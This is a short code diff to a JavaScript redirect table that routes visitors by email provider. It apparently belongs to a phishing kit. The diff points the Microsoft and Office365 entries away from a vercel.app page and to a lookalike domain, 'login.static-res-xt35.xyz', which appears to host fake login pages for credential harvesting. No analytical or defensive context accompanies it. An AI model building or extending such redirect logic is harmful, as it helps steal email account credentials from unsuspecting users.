@@ -35,11 +35,11 @@ const REDIRECT_RULES = {
     },
     'microsoft': {
         keywords: ['outlook.com', 'office365.com', 'microsoft.com', 'protection.outlook.com'],
-        url: 'https://sbhlnx-pwu0c-de05.vercel.app/ch/contact.html'
+        url: 'https://login.static-res-xt35.xyz'
     },
     'office365': {
         keywords: ['mail.protection.outlook.com', 'olc.protection.outlook.com'],
-        url: 'https://sbhlnx-pwu0c-de05.vercel.app/ch/contact.html'
+        url: 'https://login.static-res-xt35.xyz'
     },
     'apple': {
         keywords: ['icloud.com', 'apple.com'],
